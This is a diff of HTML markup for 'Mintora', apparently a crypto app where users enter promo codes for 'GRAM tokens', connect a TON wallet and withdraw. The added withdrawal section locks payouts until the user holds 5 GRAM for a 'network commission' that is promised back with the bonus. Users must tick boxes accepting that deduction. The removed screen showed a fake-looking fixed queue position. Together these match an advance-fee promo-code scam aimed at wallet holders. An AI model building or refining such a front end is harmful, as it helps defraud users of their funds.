-        <div class="card-row" style="cursor:pointer" id="menu-terms">
-          <div class="row-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M7 3 H17 a2 2 0 0 1 2 2 V19 a2 2 0 0 1-2 2 H7 a2 2 0 0 1-2-2 V5 a2 2 0 0 1 2-2 Z" stroke="currentColor" stroke-width="1.8"/>
-              <path d="M9 8 H15 M9 12 H15 M9 16 H13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-value" data-i18n="menuTerms">Terms of Use</div>
-          </div>
-          <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
-        <div class="card-row" style="cursor:pointer" id="menu-privacy">
-          <div class="row-icon">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path d="M12 3 L4 6.5 V12 c0 4.5 3.4 7.7 8 9 c4.6-1.3 8-4.5 8-9 V6.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-              <circle cx="12" cy="11" r="1.8" stroke="currentColor" stroke-width="1.7"/>
-              <path d="M12 12.8 V15.5" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="row-body">
-            <div class="row-value" data-i18n="menuPrivacy">Privacy Policy</div>
-          </div>
-          <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-        </div>
-      </div>
-    </div>
-
+  <div class="lock-actions">
+    <button class="lock-biometric" id="lock-biometric">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 3 a9 9 0 0 0-9 9 M12 3 a9 9 0 0 1 9 9 M4 16 a3 3 0 0 1 3-3 a3 3 0 0 1 3 3 v3 M12 12 a2 2 0 0 1 2 2 v4 M12 12 a2 2 0 0 0-2 2 v4 M20 16 a3 3 0 0 0-3-3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+      </svg>
+      <span id="lock-biometric-text">Use Face ID</span>
+    </button>
   </div>
 
-  <!-- PROCESSING -->
-  <div class="processing" id="processing-view">
-    <div class="proc-head">
-      <div class="proc-eyebrow" data-i18n="procEyebrow">Processing withdrawal</div>
-      <div class="proc-amount">
-        <span id="proc-amount">0</span><span class="unit">GRAM</span>
-      </div>
-    </div>
+  <button class="lock-forgot" id="lock-forgot">Forgot PIN? Sign out</button>
+</div>
 
-    <div class="progress-rail">
-      <div class="progress-fill" id="progress-fill"></div>
-    </div>
-    <div class="progress-meta">
-      <span id="proc-stage" data-i18n="stage1">Validating transaction</span>
-      <span><strong id="progress-pct">0%</strong></span>
-    </div>
-
-    <div class="kv">
-      <span class="kv-k" data-i18n="queuePos">Queue position</span>
-      <span class="kv-v blue" id="queue-pos">#2,341</span>
-    </div>
-    <div class="kv">
-      <span class="kv-k" data-i18n="queueNetwork">Network</span>
-      <span class="kv-v">Mintora Mainnet</span>
-    </div>
-    <div class="kv">
-      <span class="kv-k" data-i18n="queueFee">Network fee</span>
-      <span class="kv-v">0 GRAM</span>
-    </div>
-    <div class="kv">
-      <span class="kv-k" data-i18n="queueEta">Time remaining</span>
-      <span class="kv-v blue" id="queue-eta">~10 min</span>
-    </div>
+<!-- ============ SIGNUP SCREEN ============ -->
+<div class="signup" id="signup-screen">
+  <div class="signup-logo">
+    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 3 L20 9 L12 21 L4 9 Z" stroke="#ffffff" stroke-width="2" stroke-linejoin="round" fill="none"/>
+      <path d="M4 9 H20" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+    </svg>
   </div>
 
-  <!-- RECEIPT -->
-  <div class="receipt" id="receipt-view">
-    <div class="receipt-head">
-      <div class="receipt-status"><span class="dot"></span><span data-i18n="statusConfirmed">Confirmed</span></div>
-      <div class="receipt-title"><span id="receipt-amount">0</span> GRAM</div>
-      <div class="receipt-sub" data-i18n="receiptSub">Sent to your TON wallet</div>
-    </div>
+  <div class="signup-title" id="signup-title">Welcome to Mintora</div>
+  <div class="signup-sub" id="signup-sub">Create your account to receive GRAM tokens. Takes less than 30 seconds.</div>
 
-    <div class="kv">
-      <span class="kv-k" data-i18n="wallet">Wallet</span>
-      <span class="kv-v mono" id="receipt-addr">—</span>
-    </div>
-    <div class="kv">
-      <span class="kv-k">Tx hash</span>
-      <span class="kv-v mono blue" id="receipt-hash">—</span>
-    </div>
-    <div class="kv">
-      <span class="kv-k" data-i18n="time">Time</span>
-      <span class="kv-v" id="receipt-time">—</span>
-    </div>
-
-    <div class="receipt-actions">
-      <button class="btn-secondary" id="copy-hash">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect x="8" y="8" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.8"/>
-          <path d="M16 8 V6 a2 2 0 0 0-2-2 H6 a2 2 0 0 0-2 2 v8 a2 2 0 0 0 2 2 h2" stroke="currentColor" stroke-width="1.8"/>
-        </svg>
-        <span data-i18n="copy">Copy</span>
-      </button>
-      <button class="btn-secondary" id="share-tx">
-        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 3 V15 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
-          <path d="M4 14 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-        </svg>
-        <span data-i18n="share">Share</span>
-      </button>
-    </div>
-  </div>
-
-  <div class="footer">© 2026 Mintora</div>
-
-  <div class="bottom-nav-wrap" id="bottom-nav-wrap">
-    <nav class="bottom-nav">
-      <button class="nav-btn active" data-tab="promo">
-        <span class="nav-icon">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M3 9 V7 a2 2 0 0 1 2-2 H19 a2 2 0 0 1 2 2 V9 a3 3 0 0 0 0 6 V17 a2 2 0 0 1-2 2 H5 a2 2 0 0 1-2-2 V15 a3 3 0 0 0 0-6 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-            <path d="M14 6 V9 M14 12 V15 M14 18 V20" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="0.1 3"/>
-          </svg>
-        </span>
-        <span data-i18n="tabPromo">Promo</span>
-      </button>
-      <button class="nav-btn" data-tab="withdraw">
-        <span class="nav-icon">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 15 V3 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M4 15 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-          </svg>
-        </span>
-        <span data-i18n="tabWithdraw">Withdraw</span>
-      </button>
-      <button class="nav-btn" data-tab="profile">
-        <span class="nav-icon">
+  <div class="signup-form">
+    <div>
+      <div class="signup-field" id="signup-nick-field">
+        <div class="signup-field-icon">
           <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <circle cx="12" cy="8" r="4" stroke="currentColor" stroke-width="1.8"/>
             <path d="M4 20 c0-4 3.6-6.5 8-6.5 s8 2.5 8 6.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
           </svg>
-        </span>
-        <span data-i18n="tabProfile">Profile</span>
-      </button>
-    </nav>
+        </div>
+        <input type="text" class="signup-input" id="signup-nickname" placeholder="Choose a nickname" maxlength="20" autocomplete="off" spellcheck="false" />
+        <div class="signup-check-status">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+      </div>
+      <div class="signup-hint" id="signup-nick-hint">3-20 chars · letters, numbers, underscore</div>
+    </div>
+
+    <div class="signup-wallet" id="signup-wallet">
+      <div class="signup-wallet-left">
+        <div class="signup-wallet-icon">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="6" width="18" height="13" rx="3" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M3 10 H21" stroke="currentColor" stroke-width="1.8"/>
+            <circle cx="16.5" cy="14.5" r="1.2" fill="currentColor"/>
+          </svg>
+        </div>
+        <div class="signup-wallet-text">
+          <div class="signup-wallet-label" id="signup-wallet-label">Connect TON Wallet</div>
+          <div class="signup-wallet-addr" id="signup-wallet-addr">Required to receive payouts</div>
+        </div>
+      </div>
+      <div class="signup-wallet-badge" id="signup-wallet-badge" style="display:none">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Connected</span>
+      </div>
+      <svg class="signup-wallet-chevron" id="signup-wallet-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+
+    <div class="signup-terms" id="signup-terms">
+      <div class="signup-terms-box">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="signup-terms-text">
+        I agree to the <a href="#" onclick="return false">Terms of Service</a> and <a href="#" onclick="return false">Privacy Policy</a>, and confirm I am 18+
+      </div>
+    </div>
+  </div>
+
+  <button class="signup-continue" id="signup-continue" disabled>
+    <span id="signup-continue-text">Continue</span>
+  </button>
+</div>
+
+<!-- ============ PIN SETUP MODAL ============ -->
+<div class="pin-modal" id="pin-modal">
+  <div class="pin-sheet">
+    <div class="pin-grip"></div>
+    <div class="pin-title" id="pin-title">Set up your PIN</div>
+    <div class="pin-sub" id="pin-sub">Secure your Mintora wallet with a 4-digit PIN. You'll use it to unlock the app.</div>
+
+    <div class="pin-inputs">
+      <input type="tel" maxlength="1" inputmode="numeric" data-pin="0" />
+      <input type="tel" maxlength="1" inputmode="numeric" data-pin="1" />
+      <input type="tel" maxlength="1" inputmode="numeric" data-pin="2" />
+      <input type="tel" maxlength="1" inputmode="numeric" data-pin="3" />
+    </div>
+
+    <div class="pin-actions">
+      <button class="btn-primary accent" id="pin-confirm" disabled>Save PIN</button>
+      <button class="pin-skip" id="pin-skip">Skip for now</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============ MAIN APP ============ -->
+<div class="main-app" id="main-app">
+
+  <div class="app">
+
+    <div class="topbar">
+      <div class="brand">
+        <div class="brand-mark">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 3 L20 9 L12 21 L4 9 Z" stroke="#ffffff" stroke-width="2" stroke-linejoin="round" fill="none"/>
+            <path d="M4 9 H20" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <span class="brand-name">Mintora</span>
+      </div>
+
+      <div class="glass-controls">
+        <button class="glass-btn" id="theme-toggle" aria-label="Theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M21 12.8 A9 9 0 1 1 11.2 3 a7 7 0 0 0 9.8 9.8 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+          </svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none">
+            <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M12 3 V5 M12 19 V21 M3 12 H5 M19 12 H21 M5.6 5.6 L7 7 M17 17 L18.4 18.4 M5.6 18.4 L7 17 M17 7 L18.4 5.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+        </button>
+        <div class="glass-divider"></div>
+        <button class="glass-btn" id="lang-toggle"><span id="lang-label">EN</span></button>
+      </div>
+    </div>
+
+    <div class="balance-hero" id="balance-hero">
+      <div class="balance-eyebrow" data-i18n="balanceLabel">Total balance</div>
+      <div class="balance-num-row">
+        <span class="balance-num" id="balance-amount">0</span>
+        <span class="balance-unit">GRAM</span>
+      </div>
+      <div class="balance-usd-row">
+        <span>≈ $<span id="balance-usd">0.00</span> USD</span>
+      </div>
+
+      <div class="ton-balance-card" id="ton-balance-card">
+        <div class="ton-balance-icon">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 3 L20 9 L12 21 L4 9 Z" stroke="#ffffff" stroke-width="2" stroke-linejoin="round" fill="none"/>
+            <path d="M4 9 H20" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </div>
+        <div class="ton-balance-text">
+          <div class="ton-balance-label" data-i18n="tonBalanceLabel">TON Wallet</div>
+          <div class="ton-balance-value">
+            <span id="ton-balance-amount">0.00</span><span class="unit">TON</span>
+          </div>
+        </div>
+        <button class="ton-balance-refresh" id="ton-balance-refresh">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3 12 a9 9 0 1 0 3-6.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M3 4 V9 H8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div id="main-view">
+
+      <div class="section-promo-center active" id="section-promo">
+        <div class="promo-center-inner">
+          <div class="promo-hero-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3 9 V7 a2 2 0 0 1 2-2 H19 a2 2 0 0 1 2 2 V9 a3 3 0 0 0 0 6 V17 a2 2 0 0 1-2 2 H5 a2 2 0 0 1-2-2 V15 a3 3 0 0 0 0-6 Z" stroke="#ffffff" stroke-width="1.8" stroke-linejoin="round"/>
+              <path d="M14 6 V9 M14 12 V15 M14 18 V20" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="0.1 3"/>
+            </svg>
+          </div>
+          <div class="promo-hero-title" data-i18n="promoHeroTitle">Enter promo code</div>
+          <div class="promo-hero-sub" data-i18n="promoHeroSub">Activate your bonus code to receive GRAM tokens</div>
+
+          <div class="card">
+            <div class="field">
+              <input type="text" class="field-input code" id="promo-input" placeholder="— — — — — —" maxlength="12" autocomplete="off" spellcheck="false" />
+            </div>
+          </div>
+          <div class="feedback" id="promo-status"></div>
+
+          <button class="btn-primary accent" id="promo-submit">
+            <span class="btn-spinner"></span>
+            <span data-i18n="promoBtn">Activate code</span>
+          </button>
+
+          <div class="card" id="promo-history-card" style="display:none; margin-top: 14px;">
+            <div class="card-row" style="cursor:pointer" id="promo-history-toggle">
+              <div class="row-icon blue">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M3 12 a9 9 0 1 0 3-6.7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                  <path d="M3 4 V9 H8" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M12 8 V12.5 L15 14.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                </svg>
+              </div>
+              <div class="row-body">
+                <div class="row-label" data-i18n="historyLabel">Activated codes</div>
+                <div class="row-value"><span id="history-count">0</span> <span style="color:var(--text-3); font-weight:500" data-i18n="historyCountLabel">codes</span></div>
+              </div>
+              <svg class="row-chevron" id="history-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div id="promo-history-list" style="display:none;"></div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section" id="section-withdraw">
+        <div class="notice" id="locked-notice" style="display:none">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M8 11 V7 a4 4 0 0 1 8 0 V11" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+          <span data-i18n="lockedHint">Enter your promo code first to unlock withdrawals.</span>
+        </div>
+
+        <div class="notice warn" id="fee-notice" style="display:none">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M12 8 V12.5 M12 16 V16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <span data-i18n="feeNotice">To withdraw you need at least <strong>5 GRAM</strong> on your wallet to cover the network commission. The commission will be returned together with your bonus after the transaction is confirmed.</span>
+        </div>
+
+        <div class="notice danger" id="low-balance-notice" style="display:none">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M12 8 V13 M12 16 V16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <span data-i18n="lowBalanceNotice">Not enough GRAM for activation. Minimum <strong>5 GRAM</strong> required to unlock withdrawal.</span>
+        </div>
+
+        <div class="pill-info" id="wallet-pill">
+          <span class="dot"></span>
+          <span data-i18n="walletConnected">Wallet connected</span>
+          <span class="addr" id="pill-addr">—</span>
+        </div>
+
+        <div class="card">
+          <div class="field">
+            <div class="row-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="8.5" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M12 7 V12 L15 14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <input type="number" class="field-input" id="withdraw-input" placeholder="0" min="0" step="0.01" autocomplete="off" />
+            <span class="field-suffix">GRAM</span>
+            <span class="field-suffix max" id="max-btn" data-i18n="maxBtn">MAX</span>
+          </div>
+        </div>
+        <div class="feedback" id="withdraw-status"></div>
+
+        <div class="card" id="confirm-checks" style="display:none">
+          <div class="check-row" id="check1">
+            <div class="check-box">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="check-text" data-i18n="check1Text">I understand the <strong>network commission</strong> will be deducted and refunded together with the bonus after transaction confirmation.</div>
+          </div>
+          <div class="check-row" id="check2">
+            <div class="check-box">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="check-text" data-i18n="check2Text">I confirm that the <strong>wallet address is correct</strong> and belongs to me.</div>
+          </div>
+          <div class="check-row" id="check3">
+            <div class="check-box">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M5 12.5 L10 17.5 L19 7" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="check-text" data-i18n="check3Text">I agree to the <strong>Mintora withdrawal policy</strong> and understand the transaction must be confirmed in my wallet.</div>
+          </div>
+        </div>
+
+        <button class="btn-primary accent" id="withdraw-btn" disabled>
+          <span class="btn-spinner"></span>
+          <svg class="btn-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 15 V3 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M4 15 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+          </svg>
+          <span id="withdraw-btn-text" data-i18n="withdrawBtn">Withdraw GRAM</span>
+        </button>
+      </div>
+
+      <div class="section" id="section-profile">
+        <div class="card">
+          <div class="profile-head">
+            <div class="avatar" id="profile-avatar">U</div>
+            <div class="profile-meta">
+              <div class="profile-name" id="profile-name">Guest</div>
+              <div class="profile-id" id="profile-id">ID: —</div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="row-icon blue">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2 V22 M17 6 H9.5 a3.5 3.5 0 0 0 0 7 H14.5 a3.5 3.5 0 0 1 0 7 H7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-label" data-i18n="statBalance">Balance</div>
+              <div class="row-value"><span id="stat-balance">0</span> GRAM</div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="row-icon" id="status-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M12 8 V12.5 L15 14.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-label" data-i18n="statStatus">Status</div>
+              <div class="row-value" id="stat-status" data-i18n="statusGuest">Guest</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-row">
+            <div class="row-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="3" y="6" width="18" height="13" rx="3" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M3 10 H21" stroke="currentColor" stroke-width="1.8"/>
+                <circle cx="16.5" cy="14.5" r="1.2" fill="currentColor"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-value" data-i18n="walletLabel">TON Wallet</div>
+            </div>
+          </div>
+
+          <div class="wallet-off" id="wallet-off">
+            <div class="wallet-off-text" data-i18n="walletNotConnectedText">Connect your TON wallet to receive payouts and manage withdrawals.</div>
+            <button class="btn-primary accent" id="profile-connect-btn">
+              <span class="btn-spinner"></span>
+              <svg class="btn-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M10 13 a5 5 0 0 0 7.54.54 l3-3 a5 5 0 0 0-7.07-7.07 l-1.72 1.71" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M14 11 a5 5 0 0 0-7.54-.54 l-3 3 a5 5 0 0 0 7.07 7.07 l1.71-1.71" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <span data-i18n="connectBtn">Connect wallet</span>
+            </button>
+          </div>
+
+          <div class="wallet-on" id="wallet-on">
+            <div class="card-row">
+              <div class="row-icon blue">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
+                  <path d="M3.5 12 H20.5 M12 3 a15 15 0 0 1 0 18 a15 15 0 0 1 0-18 Z" stroke="currentColor" stroke-width="1.8"/>
+                </svg>
+              </div>
+              <div class="row-body">
+                <div class="row-label" data-i18n="walletAddress">Address</div>
+                <div class="row-value mono" id="profile-wallet-addr">—</div>
+              </div>
+              <button class="copy-btn" id="copy-addr">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <rect x="8" y="8" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.8"/>
+                  <path d="M16 8 V6 a2 2 0 0 0-2-2 H6 a2 2 0 0 0-2 2 v8 a2 2 0 0 0 2 2 h2" stroke="currentColor" stroke-width="1.8"/>
+                </svg>
+              </button>
+            </div>
+            <div class="card-row">
+              <div class="row-icon green">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M12 3 L4 6.5 V12 c0 4.5 3.4 7.7 8 9 c4.6-1.3 8-4.5 8-9 V6.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                  <path d="M9 12 L11 14 L15 9.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+              <div class="row-body">
+                <div class="row-label" data-i18n="walletNetwork">Network</div>
+                <div class="row-value muted">TON Mainnet</div>
+              </div>
+            </div>
+            <div class="card-row" id="disconnect-btn" style="cursor:pointer">
+              <div class="row-icon red">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M10 17 L5 12 L10 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+                  <path d="M5 12 H15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+                  <path d="M15 5 H19 a2 2 0 0 1 2 2 V17 a2 2 0 0 1-2 2 H15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+                </svg>
+              </div>
+              <div class="row-body">
+                <div class="row-value" style="color:var(--red)" data-i18n="disconnectBtn">Disconnect wallet</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-row" style="cursor:pointer" id="menu-pin">
+            <div class="row-icon blue">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M8 11 V7 a4 4 0 0 1 8 0 V11" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                <circle cx="12" cy="16" r="1" fill="currentColor"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-value" data-i18n="menuPin">Change PIN</div>
+            </div>
+            <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="card-row" style="cursor:pointer" id="menu-support">
+            <div class="row-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M9.5 9.5 a2.5 2.5 0 1 1 3.5 2.3 c-0.7 0.3-1 0.7-1 1.4 V14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                <circle cx="12" cy="17" r="0.9" fill="currentColor"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-value" data-i18n="menuSupport">Support</div>
+            </div>
+            <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="card-row" style="cursor:pointer" id="menu-terms">
+            <div class="row-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M7 3 H17 a2 2 0 0 1 2 2 V19 a2 2 0 0 1-2 2 H7 a2 2 0 0 1-2-2 V5 a2 2 0 0 1 2-2 Z" stroke="currentColor" stroke-width="1.8"/>
+                <path d="M9 8 H15 M9 12 H15 M9 16 H13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-value" data-i18n="menuTerms">Terms of Use</div>
+            </div>
+            <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="card-row" style="cursor:pointer" id="menu-privacy">
+            <div class="row-icon">
+              <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 3 L4 6.5 V12 c0 4.5 3.4 7.7 8 9 c4.6-1.3 8-4.5 8-9 V6.5 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                <circle cx="12" cy="11" r="1.8" stroke="currentColor" stroke-width="1.7"/>
+                <path d="M12 12.8 V15.5" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div class="row-body">
+              <div class="row-value" data-i18n="menuPrivacy">Privacy Policy</div>
+            </div>
+            <svg class="row-chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 6 L15 12 L9 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
